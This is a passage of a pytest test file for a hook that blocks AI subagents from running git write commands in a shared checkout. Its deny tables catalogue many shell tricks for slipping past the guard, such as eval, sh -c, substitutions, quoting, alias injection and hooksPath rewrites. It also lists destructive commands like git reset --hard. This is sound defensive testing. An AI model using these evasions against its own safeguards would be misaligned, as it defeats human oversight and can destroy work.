# SPDX-License-Identifier: AGPL-3.0-or-later
"""The subagent git-write guard, ``subagent_git_write_requires_orchestrator``.

One copy: ``conexus/hooks/scripts/routing/subagent_git_write_requires_orchestrator.py``,
the script ``hooks.json`` runs on every PreToolUse Bash call (RDR-184 Gap-4,
nexus-s88vq; widened by nexus-ays2l and hardened over nexus-3c92m rounds
1-9 and nexus-0r5l8).

A subagent (a PreToolUse payload carrying ``agent_id``) is denied any git
write verb in the PRIMARY checkout. The main conversation, read-only git,
linked-worktree agents and a ``# routing-allow:`` escape pass; a cwd whose
worktree state cannot be determined fails CLOSED.

Every case drives the real script as a subprocess, the way Claude Code
does. The deny and allow tables are grouped by bypass family so a red names
the family, and each assertion names the command that broke it.
"""
from __future__ import annotations

import base64
import importlib.util
import json
import os
import pathlib
import runpy
import subprocess
import sys
import time

try:
    import resource
except ImportError:  # Windows has no getrusage
    resource = None
from concurrent.futures import ThreadPoolExecutor

import pytest

PROJECT_ROOT = pathlib.Path(__file__).parent.parent
ROUTING = PROJECT_ROOT / "conexus" / "hooks" / "scripts" / "routing"
SCRIPT = ROUTING / "subagent_git_write_requires_orchestrator.py"

AGENT_ID = "aworker-x-6f59dab8bbb14864"

#: Characters a heredoc-free source file cannot spell inline without making
#: the shapes below unreadable.
D = chr(36)  # dollar
BT = chr(96)  # backtick
BS = chr(92)  # backslash


def _payload(cmd: str, *, agent: bool = True, cwd: str | None = None) -> dict:
    payload: dict = {"tool_name": "Bash", "tool_input": {"command": cmd}}
    if agent:
        payload["agent_id"] = AGENT_ID
        payload["agent_type"] = "worker-x"
    if cwd is not None:
        payload["cwd"] = cwd
    return payload


def _run_raw(stdin_text: str, env_extra: dict[str, str] | None = None):
    """Spawn the script. ``NX_HOOK_PYTHON`` pins the interpreter its
    preamble resolves to ``sys.executable``, so the re-exec is a no-op and
    the case exercises THIS checkout rather than the box's installed
    generation."""
    env = os.environ.copy()
    env["NX_HOOK_PYTHON"] = sys.executable
    if env_extra:
        env.update(env_extra)
    return subprocess.run(
        [sys.executable, str(SCRIPT)],
        input=stdin_text, capture_output=True, text=True, timeout=20, env=env,
    )


def _run(payload: dict):
    return _run_raw(json.dumps(payload))


def _hso(proc) -> dict:
    """The envelope's ``hookSpecificOutput``, or ``{}`` for a no-decision
    (empty stdout) verdict. A pass-through emits NOTHING, so
    ``"permissionDecision" not in out`` is the "not blocked" assertion."""
    assert proc.returncode == 0, proc.stderr
    if proc.stdout == "":
        return {}
    return json.loads(proc.stdout)["hookSpecificOutput"]


def _verdict(cmd: str, cwd: pathlib.Path, *, agent: bool = True) -> dict:
    return _hso(_run(_payload(cmd, agent=agent, cwd=str(cwd))))


def _denied(cmd: str, cwd: pathlib.Path) -> bool:
    return _verdict(cmd, cwd).get("permissionDecision") == "deny"


def _deny_flags(cmds: list[str], cwd: pathlib.Path) -> list[bool]:
    """One verdict per command, from parallel subprocesses."""
    with ThreadPoolExecutor(max_workers=8) as pool:
        return list(pool.map(lambda c: _denied(c, cwd), cmds))


def _not_denied(cmds: list[str], cwd: pathlib.Path) -> list[str]:
    return [c for c, hit in zip(cmds, _deny_flags(cmds, cwd)) if not hit]


def _denied_among(cmds: list[str], cwd: pathlib.Path) -> list[str]:
    return [c for c, hit in zip(cmds, _deny_flags(cmds, cwd)) if hit]


@pytest.fixture(autouse=True)
def _isolate_log(tmp_path, monkeypatch):
    """The script logs to the routing log / drop meter; keep every path
    under tmp so a run never reaches a live engine or the real config."""
    monkeypatch.setenv("NX_ROUTING_LOG_PATH", str(tmp_path / "log.jsonl"))
    monkeypatch.setenv("NEXUS_CONFIG_DIR", str(tmp_path / "isolated-nexus-config"))
    monkeypatch.delenv("NX_SERVICE_URL", raising=False)
    monkeypatch.setenv("NX_DROPPED_WRITES_LOG_PATH", str(tmp_path / "dropped_writes.jsonl"))


@pytest.fixture()
def shared_repo(tmp_path: pathlib.Path) -> pathlib.Path:
    """A PRIMARY git checkout (git-dir == git-common-dir)."""
    repo = tmp_path / "shared"
    repo.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    return repo


@pytest.fixture()
def linked_worktree(shared_repo: pathlib.Path, tmp_path: pathlib.Path) -> pathlib.Path:
    (shared_repo / "f.txt").write_text("x")
    subprocess.run(["git", "add", "f.txt"], cwd=shared_repo, check=True)
    subprocess.run(
        ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "init"],
        cwd=shared_repo, check=True,
    )
    wt = tmp_path / "wt"
    subprocess.run(
        ["git", "worktree", "add", "-q", "-b", "wt-branch", str(wt)],
        cwd=shared_repo, check=True,
    )
    return wt


# ---------------------------------------------------------------------------
# Wiring: the script on disk is the one hooks.json and registry.yaml name.
# ---------------------------------------------------------------------------


def test_the_one_copy_is_wired():
    hooks = json.loads((PROJECT_ROOT / "conexus" / "hooks" / "hooks.json").read_text())
    declared: list[str] = []
    for entry in hooks["hooks"]["PreToolUse"]:
        for h in entry.get("hooks", []):
            if isinstance(h, dict):
                declared.extend(a for a in h.get("args", []) if isinstance(a, str))
    wired = "${CLAUDE_PLUGIN_ROOT}/hooks/scripts/routing/" + SCRIPT.name
    assert wired in declared, f"hooks.json PreToolUse does not run {SCRIPT.name}: {declared}"
    assert SCRIPT.is_file()
    assert "subagent_git_write_requires_orchestrator:" in (ROUTING / "registry.yaml").read_text()
    assert not (PROJECT_ROOT / "src" / "nexus" / "hooks" / "subagent_git_write_gate.py").exists(), (
        "a second copy of the guard is back in the wheel"
    )


# ---------------------------------------------------------------------------
# DENY tables. Each family is one collected case; each entry is a command a
# subagent must not be able to run in the shared tree.
# ---------------------------------------------------------------------------

_DENY_FAMILIES: dict[str, list[str]] = {
    # The index writers, the working-tree destroyers and the history movers.
    "write_verbs": [
        "git commit -m msg",
        "git add src/file.py",
        "git add -N t3.py",
        "git add --intent-to-add t3.py",
        "git checkout -- src/nexus/upgrade_finish.py",
        "git checkout HEAD -- src/nexus/upgrade_finish.py",
        "git checkout main",
        "git restore src/nexus/upgrade_finish.py",
        "git restore .",
        "git reset --hard",
        "git reset --hard HEAD",
        "git reset -- t3.py",
        "git reset t3.py",
        "git clean -fd",
        "git stash",
        "git stash push -m wip",
        "git rm -f src/nexus/upgrade_finish.py",
        "git switch main",
        "git switch -c newbranch",
        "git switch --detach HEAD",
        "git merge topic",
        "git rebase main",
        "git cherry-pick abc123",
        "git push origin develop",
        "git mv a b",
        "git branch -D topic",
        "git tag -d v1",
        "git worktree add ../w",
        "git worktree remove w1",
        "git update-ref -d refs/heads/x",
        "git reflog expire --all",
        "git gc",
    ],
    # nexus-3c92m round 4 retired the read-only-spelling refinement: a
    # `git stash list` is denied like any other stash.
    "stash_read_forms_since_round4": ["git stash list", "git stash show -p"],
    # Options between `git` and the verb.
    "global_flags": [
        "git -C {repo} commit -m msg",
        "git -C {repo} restore .",
        "git --no-pager checkout -- x.py",
        "git -c user.name=x commit -m m",
        "git -c user.name=" + ("a" * 200) + " checkout -- t3.py",
        "git " + " ".join(f"-c a.b{i}=v" for i in range(30)) + " checkout -- t3.py",
        "git " + ("x" * 300) + " checkout -- t3.py",
    ],
    # A write verb hidden after something harmless, in every join shape.
    "chained_and_nested": [
        "uv run pytest && git add x.py && git commit -m done",
        "pytest -q && git checkout -- src/nexus/upgrade_finish.py",
        "cd {repo} && git checkout -- f.py",
        "echo hi; git checkout -- t3.py",
        "true || git add x",
        "echo hi | git add x",
        "(git add x)",
        "{ git checkout -- f; }",
        "x=$(git checkout -- t3.py)",
        "x=" + BT + "git checkout -- t3.py" + BT,
        "for f in a b; do git checkout -- $f; done",
        "if true; then git add f; fi",
        "\n".join(["if true; then", "  git checkout -- t3.py", "fi"]),
        "\n".join(["# setup step", "git checkout -- t3.py"]),
        "\n".join(["git add -N t3.py", "git reset -- t3.py"]),
        "\n".join(["cd {repo}", 'echo "staging"', "git add -N t3.py"]),
        "\n".join(["cd d", "git add f"]),
        "ls .git; git add x",
        "cd .github && git checkout -- f",
        "ls nexus-git-policy.py .git && git reset --hard",
    ],
    # `git` spelled as a path, a wrapper, a dotted or hyphenated binary.
    "git_spellings": [
        "/usr/bin/git checkout f",
        "./git add x",
        "../bin/git commit -m x",
        "FOO=1 git commit -m x",
        "A=1 B=2 git reset --hard",
        "env GIT_DIR=x git commit -m x",
        "command git add x",
        "exec git reset --hard",
        "xargs git rm",
        "nice git commit -m x",
        "time git checkout f",
        "sudo git add x",
        "git-checkout -- f",
        "/usr/lib/git-core/git-add x",
        "git.exe checkout -- f",
        "git.cmd checkout -- f",
        "git.bat reset --hard",
        "git.com add x",
        "git.sh reset --hard",
        "git-lfs.exe checkout -- f",
        "git-add.exe x",
        "git-{add,x}",
        "$(command -v git) reset --hard",
        "${GITBIN:-git} checkout -- f",
        "g=git; $g checkout -- x",
        "p=/usr/libexec/git-core/git-; ${p}reset --hard",
        "p=/Library/Developer/CommandLineTools/usr/libexec/git-core/git-; ${p}add f",
        "scripts/git-push-develop.sh abc123",
        "NX_PUSH_SOURCE=HEAD scripts/git-push-develop.sh abc123",
    ],
    # Quoting, escaping and line-continuation inside or around the verb.
    "quoting_and_escapes": [
        'git com"mit" -m msg',
        'git com"mit -m msg',
        'git commit -m "unterminated',
        "'git' checkout -- f",
        '"git" "checkout" -- f',
        "git che" + BS + "ckout -- t3.py",
        "git ad" + BS + "d -N t3.py",
        "git re" + BS + "set --hard",
        "g" + BS + "it checkout -- t3.py",
        BS + "git checkout -- x",
        "git " + BS + "\ncheckout -- t3.py",
        "git " + BS + "\r\ncheckout -- t3.py",
        "git${IFS}checkout -- t3.py",
    ],
    # Text that becomes shell: -c, eval, heredocs, pipes, substitutions.
    "shell_wrapped": [
        "sh -c 'git checkout -- f'",
        "eval 'git checkout -- f'",
        "bash <<< 'git checkout -- f'",
        "\n".join(['cat <<< "hello"', "git checkout -- t3.py"]),
        "printf 'git checkout -- t3.py' | sh",
        "echo 'git checkout -- t3.py' | bash",
        ". <(echo 'git checkout -- t3.py')",
        "diff <(git checkout -- t3.py) /dev/null",
        "echo hi > >(git checkout -- t3.py)",
        "\n".join(["bash <<'EOF'", "git checkout -- t3.py", "EOF"]),
        "\n".join(["/bin/bash <<EOF", "git checkout -- t3.py", "EOF"]),
        "\n".join(["env bash <<EOF", "git checkout -- t3.py", "EOF"]),
        "\n".join(["sudo bash <<EOF", "git checkout -- t3.py", "EOF"]),
        "\n".join(["xargs sh <<EOF", "git checkout -- t3.py", "EOF"]),
        "\n".join(["source <<EOF", "git checkout -- t3.py", "EOF"]),
        # A non-shell heredoc whose last body line ends in a backslash must
        # not swallow the terminator and everything after it.
        "\n".join(["python3 - <<'EOF'", "x = 1 " + BS, "EOF", "git checkout -- t3.py"]),
        # The multi-line shape of the 2026-08-20 incident: cd, echo, a python
        # heredoc, then the verb on a later line.
        "\n".join([
            "cd {repo}", 'echo "=== Falsify #1 ==="', "python3 - <<'EOF'",
            "with open('t3.py') as fh:", "    content = fh.read()", "EOF",
            'echo "checking output"', "git checkout -- t3.py",
        ]),
    ],
    # An expansion glued into the verb or into `git`: whatever it resolves
    # to at runtime, the text cannot be proven harmless.
    "spliced_expansions": [
        "git ch${x:-e}ckout -- f",
        "g${x:-i}t checkout -- f",
        "g$(echo i)t checkout -- f",
        "git ch$(echo e)ckout -- f",
        "git ch" + BT + "echo e" + BT + "ckout -- f",
        "git ch$(echo $(echo e))ckout -- f",
        "git ch$(python -c 'x')ckout -- f",
        "git ch$(cmd)ckout -- f",
        "git ch${VAR}ckout -- f",
        "git re${x}set --hard",
        "gi${X}t commit",
        "g$'" + BS + "151't checkout -- f",
        "git$'" + BS + "t'checkout -- f",
        "g${a}${b}i${c}${d}t checkout -- t3.py",
        "g${a}${b}${c}it checkout -- t3.py",
        "git ch${a}${b}eckout -- t3.py",
        "g$(true)$(true)it checkout -- t3.py",
        "g" + BT + "true" + BT + BT + "true" + BT + "it checkout -- t3.py",
        # compound verbs
        "git worktree re${x}move w1",
        "git fil${x}ter-branch",
        "git branch -${x}d b",
        "git tag -${x}d t",
        "git update-${x}ref",
        "git symbolic-${x}ref",
        "git reflog ${x}expire --all",
        "git cherry-${x}pick abc",
    ],
    # nexus-7mgnd: the verb-side lookbehind drops a verb glued to a path
    # character. Every spelling that makes the verb its OWN argv word must
    # keep denying, whatever precedes it.
    "verb_is_its_own_word": [
        "git -C x commit",
        "git -C . add f",
        "git -C ./ checkout f",
        "git -C ../x reset --hard",
        "git --git-dir=.git --work-tree=. add f",
        "git -c a=b/c commit -m x",
        "git" + chr(9) + "commit",
        "git  commit",
        "git   -C x   commit",
        "FOO=1 git commit",
        "(git commit)",
        ";git commit",
        "$(git commit)",
        "x=$(git commit)",
        "true&&git commit",
        "true||git commit",
        "echo hi|git add x",
        "'git' 'commit'",
        '"git" "commit" -m x',
        'git "-C" x "commit"',
        "git '-C' x 'commit' -m m",
        "git -C 'x y' commit",
        # a read-only look at a path first does not excuse the real verb
        "git log feature/x-add-thing && git add f",
        "git status; ls .git/hooks/post-commit; git commit -m x",
        "git merge-base HEAD main && git merge topic",
        "git merge-tree a b c; git merge topic",
        # braces and globs that expand to a bare verb word
        "git {,x/}commit",
        "git {x,commit} f",
        "git {.,}commit",
        "git {a/,}commit",
        # only merge-base / merge-tree are read-only
        "git merge-file a b c",
        "git merge-base-foo",
        "git merge-tree.sh a b",
        "git merge-recursive a b",
        # the dispatch spelling keeps its hyphen-glued verb
        "git-commit -m x",
        "/usr/lib/git-core/git-add f",
        "x=1 /usr/lib/git-core/git-commit -m x",
        "cd ~/git/nexus && /usr/lib/git-core/git-checkout f",
        "git log a-git-add; git-add f",
        "git-merge-file a b c",
    ],
    # nexus-0l6zh: wrappers that move HEAD or rewrite the working tree of the
    # checkout they run in, without a `git` word in the command.
    "head_moving_wrappers": [
        "gh pr checkout 123",
        "gh pr co 123",
        "gh pr checkout https://github.com/Hellblazer/nexus/pull/9 --detach",
        "gh repo sync",
        "gh repo sync --force",
        "gh repo sync -b develop",
        "gh pr merge 12 --delete-branch",
        "gh pr merge 12 -d",
        "gh pr merge 12 -sd",
        # flags between the command word and the subcommand
        "gh pr -R Hellblazer/nexus checkout 5",
        "gh pr --repo Hellblazer/nexus co 5",
        "gh pr --repo=Hellblazer/nexus checkout 5",
        "gh -R Hellblazer/nexus pr checkout 5",
        "gh pr -R Hellblazer/nexus merge 5 -d",
        "gh issue -R Hellblazer/nexus develop 5 -c",
        "gh repo --help sync",
        "gh pr merge --squash --delete-branch 12",
        "gh issue develop 12 --checkout",
        "gh issue develop 12 -c",
        "gh  pr   checkout 5",
        "gh" + chr(9) + "pr checkout 5",
        "/opt/homebrew/bin/gh pr checkout 5",
        "./gh pr checkout 5",
        "gh.exe pr checkout 5",
        "FOO=1 gh pr checkout 5",
        "cd {repo} && gh pr checkout 5",
        "(gh pr checkout 5)",
        ";gh pr checkout 5",
        "x=$(gh pr checkout 5)",
        "'gh' 'pr' 'checkout' 5",
        "gh pr view 5 && gh pr checkout 5",
        "printf 'gh pr checkout 5' | sh",
        "sh -c 'gh pr checkout 5'",
        "hub checkout https://github.com/Hellblazer/nexus/pull/9",
        "hub sync",
        "hub merge https://github.com/Hellblazer/nexus/pull/9",
        "hub am https://github.com/Hellblazer/nexus/pull/9",
        "hub.exe checkout x",
        "/usr/local/bin/hub reset --hard",
        "FOO=1 hub checkout x",
        "hub pull-request && hub checkout x",
        # gh's DEFAULT alias for `pr checkout`, with and without flags
        "gh co 5",
        "gh -R Hellblazer/nexus co 5",
        "gh --repo=Hellblazer/nexus co 5",
        "gh.exe co 5",
        "gh pr view 5; gh co 5",
        "gh co 5 && rm x",
        # `pr close` deletes the local branch (and leaves it) with -d
        "gh pr close 5 -d",
        "gh pr close 5 --delete-branch",
        "gh pr -R Hellblazer/nexus close 5 --delete-branch",
        "gh pr close --delete-branch=true 5",
        # hub in command position, however the command position is reached
        "(hub checkout x)",
        "echo a | hub checkout x",
        "echo a && hub reset --hard",
        "sh -c 'hub checkout x'",
        "env hub checkout x",
        "sudo hub reset --hard",
        "x=$(hub checkout y)",
        "echo go\nhub checkout x",
        "hub sync && ls",
        "./hub sync",
        "/usr/local/bin/hub sync",
    ],
    # nexus-7mgnd, adversarial review: the shell builds words at RUNTIME, so a
    # verb glued to a path character in the TEXT can still become the git
    # subcommand. Each of these was executed by the reviewer in a throwaway repo
    # against the first cut (a generic lookbehind) and moved HEAD there; the
    # plain `\b` boundary denies every one.
    "manufactured_verbs": [
        "git $(basename /commit) -m x",
        "git $(basename ./commit) -m x",
        'git "$(basename /x/commit)" -m x',
        "git " + BT + "basename /commit" + BT + " -m x",
        'git -c alias.c="$(basename /commit)" c -m x',
        "git -c alias.c=$(basename /commit) c -m x",
        'git config alias.ci "$(basename /commit)" && git ci -m x',
        "git $(sed s~x~commit~ <<< x) -m x",
        "git $(tr -d . <<< .commit) -m x",
        "git $(cut -d/ -f2 <<< /commit) -m x",
        "git $(printf '%s' ./commit | cut -c3-) -m x",
        "git -c alias.c=$(basename x-commit | cut -c3-) c -m y",
        "git status; echo ./commit | cut -c3- | xargs -I{} git {} -m y",
        "git status; echo x-commit | cut -c3- | xargs git",
        "git status; echo ./commit | cut -c3- | xargs git -C . -c user.name=t",
        "git status; cat .git/hooks/post-commit | xargs git",
        "g=/usr/lib/git-core/git; " + D + "g-commit -m x",
        "g=/usr/lib/git-core/git; " + D + "{g}-commit -m x",
        "g=/usr/lib/git-core/git; " + chr(34) + D + "g" + chr(34) + "-commit -m x",
        "x=git; " + D + "{x}-commit",
        "git $(basename /x/checkout) -b nb",
        "git $(basename /usr/lib/git-core/git-checkout | cut -c5-) -b nb",
        "git ./commit",
        "git -commit",
        "git foo/commit",
        "git {a,/commit}",
        "git{-commit,} -m x",
        "git --git-dir=.git " + D + "(basename /x/add) f",
        # the same for the gh side: an expansion in the subcommand slot
        "gh pr $(basename /checkout) 5",
        'gh pr "$(basename /x/checkout)" 5',
        "gh $(basename /pr) checkout 5",
        "gh pr -R o/r $(basename /checkout) 5",
        "gh pr ch${x}ckout 5",
    ],
    # nexus-7mgnd: the exemptions are literals, and a shell or an interpreter
    # can rewrite a literal. Each command carries an exempt literal AND a way to
    # rebuild a word from it, so the exemption is withheld and the verb denies.
    "exemptions_withheld_when_text_can_be_rebuilt": [
        # merge-base -> merge
        "git $(basename merge-base | cut -c1-5) topic",
        "git status; echo merge-base | cut -c1-5 | xargs -I{} git {} topic",
        "git merge-base A B | sh",
        "git diff " + D + "(git merge-base A B)",
        "git diff " + BT + "git merge-base A B" + BT,
        "git merge-base A B > /tmp/out.sh; sh /tmp/out.sh",
        "git merge-base A B | tee out.sh",
        "git merge-base A B | python3 -c 'import sys'",
        "python3 -c 'import os; os.system(\"git \" + \"merge-base\"[:5] + \" t\")'",
        "sed 's/-base//e' <<< 'git merge-base'",
        "git merge-base A B; perl -e 'x'",
        "git merge-base A B >/dev/nullx",
        "git merge-base A B; ruby -e x",
        "git merge-base A B; emacs --batch",
        "git merge-base A B; eval foo",
        "git merge-base A B; xargs foo < list",
        "git merge-base A B\n. ./s",
        # hook path -> `git commit`
        "git status; echo .git/hooks/post-commit | sed 's/.*post-/git /' | sh",
        "git status; sed 's/.*post-/git /e' <<< .git/hooks/post-commit",
        "git status; ls .git/hooks/post-commit | xargs git",
        "git status; ls .git/hooks/post-commit > /tmp/o; bash /tmp/o",
        "git status; ls .git/hooks/post-commit; git " + D + "{x#*post-} -m y",
        # the two flags
        "git log --abbrev-commit | sh",
        "git diff-tree --no-commit-id HEAD | xargs -I{} git {}",
        "git log --no-commit-id " + D + "(basename /x/commit)",
        # a glued or longer token is not the exempt token
        "git status; ls x.git/hooks/post-commit",
        "git status; ls .git/hooks/post-commit-x",
        "git status; ls .git/hooks/{post-commit,x}",
        "git status; ls .git/hooks/post-{commit,x}",
        "git log --abbrev-commit-x",
        "git log --no-commit-id=1",
        "git log x--abbrev-commit",
    ],
    # nexus-7mgnd accepted false positives: a verb glued to a path or word
    # character after a git command denies. Over-blocking is the price of not
    # judging text adjacency (see manufactured_verbs). Pinned so a loosening
    # is a visible decision.
    "glued_verbs_accepted_price": [
        "git log feature/x-add-thing",
        "git log origin/feature/add-thing",
        "git log docs/add.md",
        "git diff docs/add.md",
        "git show HEAD:src/commit.py",
        "git branch nexus-96-restore",
        "git log -- scripts/nexus-96-restore",
        "git status && ls /Users/x/git/nexus-96-restore",
        "git status && echo ---clean above---",
        "git show a461db0b7 --stat; ls scratchpad/commit-a461db0b7",
        "git status && ls hooks/post-merge",
        "git log ./checkout",
        "git log ~/commit",
        "git merge-file a b c",
        "git merge-base-foo",
        "git merge-tree.sh a b",
        # an exempt literal inside a command that can rebuild text
        "git diff " + D + "(git merge-base HEAD origin/develop)..HEAD",
        "for d in a b; do git status; ls " + D + "d/.git/hooks/post-commit; done",
        "for s in 1; do git diff-tree --no-commit-id -r " + D + "s; done",
    ],
    # nexus-dsr6a: repo-config writes. `core.hooksPath` redirects which hook
    # code runs on the orchestrator's later commits and checkouts; `user.*`
    # rewrites authorship (the 2026-09-12 identity-overwrite class). Every
    # spelling that can WRITE denies; the read spellings are in
    # config_reads_stay_allowed.
    "config_writes": [
        "git config user.name x",
        "git config user.email a@b.c",
        "git config core.hooksPath /tmp/x",
        "git config --local core.hooksPath /tmp/x",
        "git config --worktree core.hooksPath /tmp/x",
        "git config --unset core.hooksPath",
        "git config --unset-all user.name",
        "git config --add remote.origin.fetch +refs/heads/x:refs/remotes/o/x",
        "git config --replace-all user.name x",
        "git config --rename-section user.old user.new",
        "git config --remove-section user",
        "git config -e",
        "git config --edit",
        "git config set user.name x",
        "git config set --append user.name x",
        "git config unset user.name",
        "git config unset --all user.name",
        "git config rename-section user.old user.new",
        "git config remove-section user",
        "git config edit",
        "git config --bool core.bare true",
        "git config --type=bool core.bare true",
        "git config --comment why user.name x",
        "git config user.name 'a b'",
        'git config user.name ""',
        "git config user.name ''",
        "git config alias.x 'log --oneline'",
        # Placement: global flags between git and the verb, wrappers, spellings.
        "git -C {repo} config user.name y",
        "git -c a.b=c config user.name y",
        "git --git-dir={repo}/.git config user.name y",
        "git --no-pager config user.name y",
        "git-config user.name x",
        "/usr/lib/git-core/git-config user.name x",
        "git.exe config user.name x",
        "FOO=1 git config user.name x",
        "env GIT_DIR=x git config user.name x",
        "command git config user.name x",
        "sudo git config user.name x",
        "git config " + BS + "\nuser.name x",
        # --global / --system rewrite identity and hooks for EVERY repo on the box.
        "git config --global user.name x",
        "git config --global user.email a@b.c",
        "git config --global core.hooksPath /tmp/x",
        "git config --global --unset user.name",
        "git config --global -e",
        "git config --global edit",
        "git config --system core.hooksPath /tmp/x",
        "git config set --global user.name x",
        # --file / -f / --blob: a text-only guard cannot prove the path is outside
        # the repo, and `.git/config`, `~/.gitconfig` and `.gitmodules` are all
        # reachable through them. Writes deny; reads are in the allow family.
        "git config --file /tmp/x/cfg user.name x",
        "git config -f /tmp/x/cfg user.name x",
        "git config --file={repo}/.git/config core.hooksPath /tmp/x",
        "git config --file ~/.gitconfig user.name x",
        "git config --file /tmp/x/cfg --unset user.name",
        "git config --file --get user.name x",
        "git config --blob HEAD:.gitmodules user.name x",
        # git stops reading options at the first positional (measured on git
        # 2.53): a trailing flag is the VALUE, so each of these writes.
        "git config user.name --global",
        "git config a.b.c --type=bool",
        "git config --local sect.key --get-colorbool remove-section",
        "git config user.name --get",
        # Abbreviated long options are accepted by git; only exact read flags pass.
        "git config --unse core.hooksPath",
        "git config --repl-all user.name x",
        "git config --ed",
        # A write after a read, in every join shape.
        "git config --get user.name; git config user.name x",
        "git config --get user.name && git config user.name x",
        "git status && git config user.name x",
        "git config user.name x && git config --get user.name",
        "git config --list; git config --global user.name x",
        "(git config user.name x)",
        "{ git config user.name x; }",
        "git config user.name x 2>/dev/null",
        "git config user.name x > /dev/null",
        "git config --get a --unset b",
        "git config --list --add a b",
        # An alias that expands to config, carried on the command line or in env.
        "git -c alias.c=config c user.name y",
        "git -c alias.c='config user.name' c y",
        "git -c 'alias.c=!git config user.name' c y",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.c GIT_CONFIG_VALUE_0=config git c user.name y",
    ],
    # The verb built by the shell. A config verb that the text does not spell
    # whole is read like every other verb: the read exemptions apply only to a
    # command that cannot rebuild text, so none of these is excused.
    "config_manufactured": [
        "git " + D + "(echo config) user.name x",
        "git " + D + "(printf config) user.name x",
        "git " + D + "(basename /config) user.name x",
        "git " + BT + "echo config" + BT + " user.name x",
        "git " + D + "{x:-config} user.name x",
        "git " + D + "{x:=config} user.name x",
        "git c" + D + "(echo onfig) user.name x",
        "git conf" + D + "{x}ig user.name x",
        "git con''fig user.name x",
        'git con"fig" user.name x',
        "git conf" + BS + "ig user.name x",
        "git " + D + "'conf" + BS + "x69g' user.name x",
        "git -C " + D + "(pwd) config user.name x",
        "git config --get " + D + "(cat keyfile)",
        "git config " + D + "(echo --unset) user.name",
        "git config " + D + "{k} " + D + "{v}",
        "git config user.name " + D + "(whoami)",
        "echo " + D + "(git config user.name)",
        "x=" + D + "(git config --get user.name)",
        "printf 'git config user.name x' | sh",
        "eval 'git config user.name x'",
        "sh -c 'git config user.name x'",
        "echo 'git config user.name x' | bash",
        "git config --get user.name | sh",
        # a `$` anywhere in the RAW command is not plain, even when the scan
        # resolves the substitution to a literal (nexus-dsr6a confirmation)
        "git config --get " + D + "(echo user.name)",
        "git config --get user.name > out.txt",
        "git config --get user.name | xargs git config user.email",
        "for k in a b; do git config --get " + D + "k; done",
        "git status; git " + D + "(echo config) user.name x",
        "git config --get a; git " + BT + "echo config" + BT + " b c",
        # An unquoted-looking `config` rebuilt from a path: a final component a
        # substitution closes is how the shell builds the word, trailing slash too.
        "git " + D + "(basename /x/config/) user.name x",
        "git " + D + "(basename /x/config) user.name x",
    ],
    # nexus-dsr6a review B1/B2: the read test counts words, and the shell decides
    # what the words are. Quote stripping erased or moved the argument that made
    # a write (a quoted metacharacter value moved text out of its segment or was
    # stripped as a redirect) and brace expansion or a glob made one word several,
    # so each of these read as a bare-key read and wrote (verified on real git).
    # Outside get/list mode a quote, a backslash or `{ } * ? [` denies.
    "config_arity_unprovable": [
        "git config core.hooksPath ';x'",
        "git config user.name ' '",
        "git config user.name '&'",
        "git config user.name '('",
        "git config user.name ')'",
        "git config user.name $'" + BS + "n'",
        "git config user.name '<x'",
        "git config user.name '>/dev/null'",
        "git config user.name '2>&1'",
        "git config user.name '|x'",
        "git config --global user.name ';x'",
        "git config --local core.hooksPath ';x'",
        "git config user.name " + BS + ";x",
        "git config user.name x" + BS + " y",
        "git config 'user.name' 'x'",
        "git config {user.name,x}",
        "git config user.{name,email}",
        "git config user.name{,x}",
        "git config {--unset,user.name}",
        "git config --global {user.name,x}",
        "git config user.*",
        "git config user.nam?",
        "git config [uv]*",
        "git config core.hooks*",
        "git config user.name x{,y}",
        "git config --worktree user.name ';x'",
        # CR is a word character to bash and a command separator to the scan
        "git config user.name \r x",
    ],
    # nexus-dsr6a confirmation B-A: a global option's value that is quoted,
    # escaped, empty, braced or holds `; & (` made the subcommand cursor take a
    # value word (or nothing) for the subcommand, so the later `config` read as
    # an argument and each of these wrote (verified on real git, see
    # test_every_config_deny_family_command_really_writes). A quote, backslash,
    # `{ } * ? [` anywhere in the raw command is not plain, so none of them is
    # read by the cursor.
    "config_global_option_values": [
        "git -c 'user.name=a b' config user.name x",
        'git -c "user.name=a b" config user.name x',
        "git -c user.name=a" + BS + " b config user.name x",
        "git -C '' config user.name x",
        'git -C "" config user.name x',
        "git -C '{repo}/sp ace' config user.name x",
        "git -C '{repo}/se;mi' config user.name x",
        "git --namespace='a b' config user.name x",
        "git --namespace 'a b' config user.name x",
        "git -c 'x.y=1;2' config user.name x",
        "git -c 'x.y=1&2' config user.name x",
        "git -c 'x.y=1|2' config user.name x",
        "git -c 'x.y=(a)' config user.name x",
        "git -c x.y=1" + BS + ";2 config user.name x",
        "git -c 'core.pager=less -R' config user.name x",
        "git -c 'a b=c' config user.name x",
        "git {--no-pager,--no-pager} config user.name x",
        "git {-p,} config user.name x",
        "git {-c,a.b=c} config user.name x",
    ],
    # nexus-dsr6a confirmation B-B and E: a config word inside a command
    # substitution's payload makes the command non-plain by definition. The
    # payload resolved to bare text (`$(echo config | cat)` became `config | cat`)
    # whose pipe split the segment, so config saw no arguments and read as a
    # bare-key read. Inside a span `config` adjoined by `.`, `-` or `/` counts.
    "config_substitution_payload": [
        "git " + D + "(echo config | cat) user.name x",
        "git " + D + "(echo config ; true) user.name x",
        "git " + D + "(echo config;) user.name x",
        "git " + D + "(echo config 2>/dev/null) user.name x",
        "git " + BT + "echo config | cat" + BT + " user.name x",
        "git " + D + "(printf config | cat) core.hooksPath /tmp/x",
        "git " + D + "(echo config|tr a-z a-z) user.name x",
        "git -c x.y=1 " + D + "(echo config |cat) user.name x",
        "git " + D + "{x:-config;} user.name x",
        "git " + D + "(basename /x/config.py .py) user.name x",
        "git " + D + "(echo x-config | cut -d- -f2) user.name x",
        "git " + D + "(echo config.py | cut -d. -f1) user.name x",
        "git " + D + "(cut -d- -f2 <<<x-config) user.name x",
        "git " + D + "(echo x_config | cut -d_ -f2) user.name x",
    ],
    # nexus-dsr6a confirmation D: an alias defined on the command line can name
    # config through a variable the text never spells.
    "config_alias_injection": [
        "CFG=config git --config-env=alias.c=CFG c user.name x",
        "export CFG=config; git --config-env alias.c=CFG c user.name x",
        "git --config-env alias.c=CFG c user.name x",
        "git --config-env=ALIAS.c=CFG c user.name x",
        "git -c alias.c=" + D + "CFG c user.name x",
        "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.c GIT_CONFIG_VALUE_0=" + D + "CFG git c user.name x",
